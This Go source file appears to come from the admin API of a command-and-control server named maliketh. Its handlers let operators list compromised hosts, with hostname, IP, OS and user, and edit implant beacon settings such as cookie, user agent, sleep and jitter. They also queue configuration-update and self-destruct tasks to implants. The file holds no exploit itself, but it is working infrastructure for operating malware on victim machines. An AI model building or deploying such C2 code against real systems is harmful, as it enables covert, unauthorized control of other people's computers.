package admin

import (
	"encoding/json"
	"net/http"

	"github.com/cbrnrd/maliketh/server-go/internal/model"
	"github.com/cbrnrd/maliketh/server-go/internal/server"
	"github.com/go-chi/chi/v5"
	"go.uber.org/zap"
)

// handleListImplants returns all registered implants.
func (h *Handler) handleListImplants() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		implants, err := h.repos.Implant.List(r.Context())
		if err != nil {
			h.logger.Error("failed to list implants", zap.Error(err))
			server.InternalError(w, "Failed to list implants")
			return
		}

		implantList := make([]map[string]any, len(implants))
		for i, imp := range implants {
			implantList[i] = implantToJSON(imp)
		}

		server.SuccessData(w, map[string]any{
			"status":   true,
			"implants": implantList,
		})
	}
}

// handleGetImplantConfig returns the config for an implant.
func (h *Handler) handleGetImplantConfig() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		implantID := chi.URLParam(r, "implant_id")

		// Resolve implant (supports aliases)
		implant, err := h.repos.Implant.Resolve(r.Context(), implantID)
		if err != nil {
			server.BadRequest(w, "Unknown implant")
			return
		}

		config, err := h.repos.Config.GetByImplantID(r.Context(), implant.ImplantID)
		if err != nil {
			h.logger.Error("failed to get implant config",
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
			server.BadRequest(w, "Unknown implant")
			return
		}

		server.SuccessData(w, map[string]any{
			"status": true,
			"config": config.ToJSON(),
		})
	}
}

// handleUpdateImplantConfig updates an implant's config and creates an UPDATE_CONFIG task.
func (h *Handler) handleUpdateImplantConfig() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		implantID := chi.URLParam(r, "implant_id")

		// Resolve implant (supports aliases)
		implant, err := h.repos.Implant.Resolve(r.Context(), implantID)
		if err != nil {
			server.BadRequest(w, "Unknown implant")
			return
		}

		var updates map[string]any
		if err := json.NewDecoder(r.Body).Decode(&updates); err != nil {
			server.BadRequest(w, "Invalid request body")
			return
		}

		if len(updates) == 0 {
			server.BadRequest(w, "No valid fields found in request")
			return
		}

		// Filter to only valid config fields
		validFields := map[string]bool{
			"cookie":                  true,
			"user_agent":              true,
			"auto_self_destruct":      true,
			"sleep_time":              true,
			"jitter":                  true,
			"max_retries":             true,
			"retry_wait":              true,
			"retry_jitter":            true,
			"tailoring_hash_function": true,
			"tailoring_hash_rounds":   true,
			"tailoring_hashes":        true,
		}

		filteredUpdates := make(map[string]any)
		for k, v := range updates {
			if validFields[k] {
				filteredUpdates[k] = v
			}
		}

		if len(filteredUpdates) == 0 {
			server.BadRequest(w, "No valid fields found in request")
			return
		}

		// Update config in database
		if err := h.repos.Config.Update(r.Context(), implant.ImplantID, filteredUpdates); err != nil {
			h.logger.Error("failed to update implant config",
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
			server.BadRequest(w, "Error updating config")
			return
		}

		h.logger.Info("updated implant config",
			zap.String("implant_id", implant.ImplantID),
			zap.String("operator", operator.Username),
			zap.Any("config", filteredUpdates))

		// Create UPDATE_CONFIG task
		task, err := h.repos.Task.Create(
			r.Context(),
			operator.Username,
			implant.ImplantID,
			model.OpUpdateConfig,
			filteredUpdates,
		)
		if err != nil {
			h.logger.Error("failed to create config update task",
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
			server.InternalError(w, "Config updated but failed to create task")
			return
		}

		server.SuccessData(w, map[string]any{
			"status": true,
			"task":   taskToJSON(task),
		})
	}
}

// handleKillImplant sends a SELFDESTRUCT task to an implant.
func (h *Handler) handleKillImplant() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		implantID := chi.URLParam(r, "implant_id")

		// Resolve implant (supports aliases)
		implant, err := h.repos.Implant.Resolve(r.Context(), implantID)
		if err != nil {
			server.BadRequest(w, "Unknown implant")
			return
		}

		// Create SELFDESTRUCT task
		_, err = h.repos.Task.Create(
			r.Context(),
			operator.Username,
			implant.ImplantID,
			model.OpSelfDestruct,
			[]any{},
		)
		if err != nil {
			h.logger.Error("failed to create selfdestruct task",
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
			server.InternalError(w, "Failed to create kill task")
			return
		}

		h.logger.Info("sent SELFDESTRUCT task",
			zap.String("implant_id", implant.ImplantID),
			zap.String("operator", operator.Username))

		server.SuccessData(w, map[string]any{"status": true})
	}
}

func implantToJSON(imp *model.Implant) map[string]any {
	return map[string]any{
		"implant_id": imp.ImplantID,
		"hostname":   imp.Hostname,
		"ip":         imp.IP,
		"os":         imp.OS,
		"arch":       imp.Arch,
		"user":       imp.Username,
		"created_at": imp.CreatedAt,
		"last_seen":  imp.LastSeen,
	}
}
